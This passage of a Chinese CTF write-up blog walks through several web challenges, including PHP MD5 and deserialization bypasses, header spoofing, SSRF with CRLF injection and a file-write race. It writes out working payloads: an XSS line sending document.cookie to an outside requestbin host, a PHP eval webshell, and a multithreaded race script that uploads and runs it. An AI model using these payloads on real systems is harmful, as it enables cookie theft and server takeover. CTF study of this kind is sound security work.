class="variable">$pass</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$before</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;query&#x27;</span>];</span><br><span class="line">            <span class="variable">$med</span> = <span class="string">&#x27;filter&#x27;</span>;</span><br><span class="line">            <span class="variable">$after</span> = preg_replace(</span><br><span class="line">                <span class="string">&quot;/<span class="subst">$med</span>/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$before</span></span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$after</span> === <span class="variable">$med</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$verify</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;verify&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$verify</span>) === <span class="variable">$pass</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$$verify</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>审计代码前面可以得出，需要<strong>MD5绕过</strong>，首先说一下漏洞：<br>    <strong>1.两个开头为0的md5值相同。</strong><br>    <strong>2.md5不能处理数组。</strong></p>
+<p>所以绕过方法显而易见了：</p>
+<p>​    <strong>方法1：v1,v2 找到两个开头为0的md5值，例如：v1=s878926199a&amp;&amp;v2=s155964671a</strong></p>
+<p>​    <strong>方法2：根据md5函数特性，用两个值不同但不可md5的数据类型，例如：v1[]=1&amp;&amp;v2[]=2</strong></p>
+<p>本题对$_COOKIE[‘token’]加密了两次，所以首先要找到加密两次是0开头的；搜索得到md5(md5(f2WfQ)) = 0e997766059721689977306698103413,所以更改cookie中的token为f2WfQ.</p>
+<p>观察下一个参数query,发现有正则替换，则选择匹配绕过，另query = filfilterter,即可使匹配后query = filter,到此就可以得到第一个flag。</p>
+<p>下面就是有一个extract($_POST);所以考虑POST方式重新传参数，<strong>考虑前面是flag1,所以猜测输出的应该是flag2</strong>，所以另verify = flag2,让pass = md5(flag2),再传参即可得到flag2值，拼接即可得到flag。</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012154057879.png" alt="image-20211012154057879"></p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012154200178.png" alt="image-20211012154200178"></p>
+<h2 id="8-😃Easy-China-Flag"><a href="#8-😃Easy-China-Flag" class="headerlink" title="8.[😃Easy]China Flag"></a>8.[😃Easy]China Flag</h2><p>打开题目地址一会就跳转，所以抓包到brupsite，如图：</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012155505800.png" alt="image-20211012155505800"></p>
+<p>所以修改payload为china.php,得到：</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012155556849.png" alt="image-20211012155556849"></p>
+<p>问我从哪来的，我们从上一个网页来的，所以构造Referer:<a target="_blank" rel="noopener" href="http://81.68.109.40:30002/index.php%EF%BC%8C%E6%8E%A5%E7%9D%80%E8%AF%B4%E6%88%91%E7%9C%9F%E6%98%AF%E5%9C%9F%E7%94%9F%E5%9C%9F%E9%95%BF%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E6%9E%84%E9%80%A0X-Forwarded-For:127.0.0.1,%E5%BE%97%E5%88%B0%E5%A6%82%E5%9B%BE%EF%BC%9A">http://81.68.109.40:30002/index.php，接着说我真是土生土长的，所以构造X-Forwarded-For:127.0.0.1,得到如图：</a></p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012155823340.png" alt="image-20211012155823340"></p>
+<p>可知最后就把Accept-Language改了，如图就得到flag:</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012155337515.png" alt="image-20211012155337515"></p>
+<h2 id="9-😯Mid-bestLanguage"><a href="#9-😯Mid-bestLanguage" class="headerlink" title="9.[😯Mid]bestLanguage"></a>9.[😯Mid]bestLanguage</h2><p>打开题目是一段PHP代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">superGate</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gay</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="variable">$honey</span> = unserialize(<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/superGate/i&quot;</span>, serialize(<span class="variable">$honey</span>)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no&quot;</span>;</span><br><span class="line">    <span class="keyword">throw</span> <span class="built_in">Exception</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>考察的序列化与反序列化，以及正则匹配的绕过</strong></p>
+<p>自己先序列化一个对象：</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012164237408.png" alt="image-20211012164237408"></p>
+<p>得到序列化结果为O:9:”superGate”:1:{s:3:”gay”;b:1;}，<strong>若要绕过正则匹配，则可以把数目改为大于真是数目，类似CVE漏洞，即把1改为2</strong>则构造payload=/?p=O%3A9%3A%22superGate%22%3A2%3A%7Bs%3A3%3A%22gay%22%3Bb%3A1%3B%7D，即可绕过匹配，显示flag:</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012164557424.png" alt="image-20211012164557424"></p>
+<h2 id="10-😮Mid-To-be-Admin-Again-and-Again"><a href="#10-😮Mid-To-be-Admin-Again-and-Again" class="headerlink" title="10.[😮Mid]To_be_Admin_Again_and_Again"></a>10.[😮Mid]To_be_Admin_Again_and_Again</h2><p>发现是留言板，在看wiki时知道留言板可能存在xss漏洞，随便输入看看，发现输入的文本保存到了这里：</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012165239858.png" alt="image-20211012165239858"></p>
+<p>1.那就试着植入一段代码，让其在内部执行，从而获取我们想要的cookie,<strong>通过植入”</textarea><script>window.open("<a target="_blank" rel="noopener" href="http://requestbin.net/r/fwx7zmnz?a=&#39;+document.cookie&quot;">http://requestbin.net/r/fwx7zmnz?a=&#39;+document.cookie&quot;</a>)</script>(将cookie信息的字符串作为URI组件进行编码，然后用a参数传递,反弹cookie)一段获取cookie到一个代理网站的脚本，读到内部cookie</strong>,其中<a target="_blank" rel="noopener" href="http://requestbin.net/r/fwx7zmnz%E4%B8%BA%E4%B8%80%E4%B8%AA%E5%B9%B3%E5%8F%B0%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E6%98%BE%E7%A4%BA%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E7%BD%91%E7%AB%99%E7%9A%84%E4%BF%A1%E6%81%AF%E3%80%82">http://requestbin.net/r/fwx7zmnz为一个平台，可以用来显示要获取的网站的信息。</a></p>
+<p>在这个脚本中运用到了<strong>引号闭合</strong>，即让输入的脚本不会被当作字符串处理输出，因为写程序时，双引号里的内容解释为字符串，通过增加引号可以形成引号闭合，从而执行脚本，类似SQL引号闭合。</p>
+<p>2.另一种方法是<strong>直接在XSS平台生成一段代码</strong>，直接插入即可！便可在平台直接获取到header等一些信息。</p>
+<p>要发送给admin还要<strong>计算哈希函数值</strong>，因为SHA-256是散列函数2代即哈希函数，运行脚本即可获得，如图，输入后便成功登陆：</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211012193821800.png" alt="image-20211012193821800"></p>
+<p>之后读取到cookie，返回修改cookie再重发就可以得到flag了。</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211013132505527.png" alt="image-20211013132505527"></p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211013132557171.png"></p>
+<p>附上解哈希函数值的代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> threading <span class="keyword">as</span> tr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="comment">#这里改hash算法和截取的字长(0:x实际上是x位字长)</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(<span class="built_in">str</span>(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">flag,pre=<span class="number">1</span>,last=<span class="number">100000000</span>,step=<span class="number">12500000</span></span>):</span></span><br><span class="line">    <span class="comment">#该print状态告知,觉得没必要可以省略</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+]Progress starts&quot;</span>)</span><br><span class="line">    event=tr.Event()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pre,last,step):</span><br><span class="line">        <span class="keyword">if</span> event.isSet():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        th=tr.Thread(target=divide,args=(i,step,event,flag))</span><br><span class="line">        <span class="comment">#该print为状态告知,觉得没必要可以省略</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]Thread &#123;&#125; starts&quot;</span>.<span class="built_in">format</span>(th.getName()))</span><br><span class="line">        th.start()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">divide</span>(<span class="params">pre,step,event,flag</span>):</span></span><br><span class="line">    last=pre+step</span><br><span class="line">    <span class="keyword">while</span> pre&lt;=last:</span><br><span class="line">        <span class="keyword">if</span> event.isSet():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        strs=md5(pre)</span><br><span class="line">        <span class="keyword">if</span> strs==flag:</span><br><span class="line">            event.<span class="built_in">set</span>()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]Find it!!!!!!!!!!!!!!!!!!!!!!!!!!! is %d&quot;</span>%(pre))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        pre+=<span class="number">1</span></span><br><span class="line">    <span class="comment">#以下为状态告知,觉得没必要可以省略</span></span><br><span class="line">    <span class="keyword">if</span> event.isSet():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]One thread done and some thread find it&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]One thread done but didnt get it&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="comment">#md5截断字符,起始数,结尾数,步长</span></span><br><span class="line"><span class="comment">#支持直接从命令行输入md5截断字符,默认处理为5位</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>]:</span><br><span class="line">        main(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        main(<span class="string">&quot;这里手动档&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行方法：</p>
+<p>python .\hash_slice_Intruder.py xxxxxx</p>
+<h2 id="11-😮Mid-太极掌门人"><a href="#11-😮Mid-太极掌门人" class="headerlink" title="11.[😮Mid]太极掌门人"></a>11.[😮Mid]太极掌门人</h2><p>打开题目后是一段PHP代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deleteDir</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="variable">$path</span>)) &#123;</span><br><span class="line">            <span class="variable">$dirs</span> = scandir(<span class="variable">$path</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$dirs</span> <span class="keyword">as</span> <span class="variable">$dir</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$dir</span> != <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$dir</span> != <span class="string">&#x27;..&#x27;</span>) &#123;</span><br><span class="line">                    <span class="variable">$sonDir</span> = <span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$dir</span>;</span><br><span class="line">                    <span class="keyword">if</span> (is_dir(<span class="variable">$sonDir</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                        deleteDir(<span class="variable">$sonDir</span>);</span><br><span class="line"></span><br><span class="line">                        @rmdir(<span class="variable">$sonDir</span>);</span><br><span class="line"></span><br><span class="line">                    &#125; <span class="keyword">elseif</span> (<span class="variable">$sonDir</span> !== <span class="string">&#x27;./index.php&#x27;</span></span><br><span class="line">                            &amp;&amp; <span class="variable">$sonDir</span> !== <span class="string">&#x27;./flag.php&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">                        @unlink(<span class="variable">$sonDir</span>);</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            @rmdir(<span class="variable">$path</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$devil</span> = <span class="string">&#x27;&lt;?php exit;?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$goods</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;goods&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;train&#x27;</span>], <span class="variable">$devil</span> . <span class="variable">$goods</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    deleteDir(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>先补充一下知识点，解读一下函数的意思，大致都是文件操作相关的函数：</p>
+<ol>
+<li>is_dir ( $path ) 判断当前路径是否为目录 ,返回布尔。</li>
+<li>rmdir 删除目录，删除前必须先删除目录下所有文件和目录。</li>
+<li>file_put_contents 将一个字符串写入文件</li>
+<li>scandir — 列出指定路径中的文件和目录，返回一个 array，包含有 <code>directory</code> 中的文件和目录。directory，要被浏览的目录。</li>
+<li><code>foreach</code> 语法结构提供了遍历数组的简单方式。<code>foreach</code> 仅能够应用于数组和对象。</li>
+<li>unlink — 删除文件</li>
+<li>file_get_contents(‘./目标文本文件’); <em>//取得文本文件的内容（之前序列化过的字符串）</em></li>
+</ol>
+<p>首先，要读出flag，要先绕过exit这段php代码，由于是<strong>写入文件中的，所以可以利用伪协议</strong>，<strong>将输入的字符串进行base64解码，当我们输入的字符会使解码出现乱码</strong>，<strong>那么exit就不会出现并执行</strong>。再考虑后面传入good的内容，上传一句话木马用来输入命令打开flag.php，即<?php eval($_POST["cmd"]);?>,执行POST来的cmd参数语句，利用这个功能可以查看甚至修改你的数据库数据和文件。</p>
+<p>总体就是将一句话（用来访问flag文件）写入一个文件，在脚本删掉他之前不断访问它！</p>
+<p>之后的代码就是有个sleep(1),结合后面的删除文件函数，可能会删除我们写入的文件，所以我们要做的就是比响应还要快的读到文件，所以我们要抢到在它删除之前访问文件，就如我们打开文件的时候去删除它，会提示文件文件已打开一样，这样从而防止文件被删除，也就是<strong>条件竞争</strong>，然后开始用脚本多线程攻击，这个脚本是找的改的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line">sessid = <span class="string">&#x27;bbbbbbb&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#上传一句话</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">global</span> event</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> event.isSet():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment">#上传的文件,瞎塞点数据就好了</span></span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        <span class="comment">#data就是笔记中说的需要同时POST上传的内容,作为拼接成的键名的一部分,把其值替换为一句话</span></span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://81.68.109.40:30007/&#x27;</span>, data=&#123;<span class="string">&#x27;goods&#x27;</span>: <span class="string">&#x27;aPD9waHAgZXZhbCgkX1BPU1RbImNtZCJdKTs/Pg==&#x27;</span>,<span class="string">&quot;train&quot;</span>:<span class="string">&quot;php://filter/write=convert.base64-decode/resource=ez.php&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">while</span> resp.status_code==<span class="number">429</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            resp = session.post( <span class="string">&#x27;http://81.68.109.40:30007/&#x27;</span>, data=&#123;<span class="string">&#x27;goods&#x27;</span>: <span class="string">&#x27;aPD9waHAgZXZhbCgkX1BPU1RbImNtZCJdKTs/Pg==&#x27;</span>,<span class="string">&quot;train&quot;</span>:<span class="string">&quot;php://filter/write=convert.base64-decode/resource=ez.php&quot;</span>&#125;)</span><br><span class="line"><span class="comment">#访问一句话</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">global</span> event</span><br><span class="line">    <span class="keyword">global</span> data</span><br><span class="line">    <span class="keyword">global</span> sessid</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> event.isSet():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://81.68.109.40:30007/ez.php&#x27;</span>,data=data)</span><br><span class="line">        <span class="keyword">while</span> resp.status_code==<span class="number">429</span>:</span><br><span class="line">            <span class="comment">#time.sleep(0.3)</span></span><br><span class="line">            resp = session.post(<span class="string">&#x27;http://81.68.109.40:30007/ez.php&#x27;</span>,data=data)</span><br><span class="line">        <span class="keyword">if</span> resp.status_code!=<span class="number">404</span>:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.<span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="comment">#这个多线程个人决定有点问题,拿到flag后根本停不下来</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最后拿到flag：</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211014215546856.png" alt="image-20211014215546856"></p>
+<h2 id="12-🤯Hard-To-be-Admin-Again-and-Again-and-Again"><a href="#12-🤯Hard-To-be-Admin-Again-and-Again-and-Again" class="headerlink" title="12.[🤯Hard]To_be_Admin_Again_and_Again_and_Again"></a>12.[🤯Hard]To_be_Admin_Again_and_Again_and_Again</h2><p>打开题目是一个跳转网页的服务，考虑漏洞，首先想到SSRF，因为SSRF适用于在网页跳转时进行攻击，所以接下来第一步就是想着找到靶机的地址，跳转到靶机，经过多次尝试，构造payload为：request?url=<strong>file:///proc/net/arp</strong>，这里讲解一下这个参数，可以<strong>显示当前路由器或者靶机上client的IP，name等相关信息。0x0是找不到这台主机，0x2是这台主机还在线。</strong></p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211021151745084.png" alt="image-20211021151745084"></p>
+<p>找到一条地址，就试着传进去看到：Try/source?,接着构造payload为：request?url=<a target="_blank" rel="noopener" href="http://172.16.233.233:5000/source?%E5%BE%97%E5%88%B0%EF%BC%9A">http://172.16.233.233:5000/source?得到：</a></p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211021152749182.png" alt="image-20211021152749182"></p>
+<p>通过读代码可知，要访问admin页面，同时只有验证cookie里的admin值为c 的值才会显示flag！注意这里<strong>改的是我们访问靶机的cookie，并且要求在跳转时cookie会被带过去。</strong>找了很多知识点，知道找到了<strong>CRLF注入</strong>:</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211021162846670.png" alt="image-20211021162846670"></p>
+<p>本题考察的是HTTP状态行注入恶意首部字段，例如构造payload为：url = “<a target="_blank" rel="noopener" href="http://47.101.57.72:4000/?a=1">http://47.101.57.72:4000?a=1</a> HTTP/1.1\r\nCRLF-injection: True\r\nSet-Cookie: PHPSESSID=whoami”</p>
+<p>响应之后为：<img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211105150508197.png" alt="image-20211105150508197"></p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211105150525425.png" alt="image-20211105150525425"></p>
+<p>然后构造payload为：request?url=<a target="_blank" rel="noopener" href="http://172.16.233.233:5000/admin">http://172.16.233.233:5000/admin</a>? HTTP/1.1%0D%0ACookie:admin=6a9e47ca067b07047e3d571512ec4f82%0D%0A%0D%0A/,即可得到flag:</p>
+<p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211021162506147.png" alt="image-20211021162506147"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/17/hello-world/" rel="prev" title="Hello World">
+      <i class="fa fa-chevron-left"></i> Hello World
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/11/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="反序列化">
+      反序列化 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
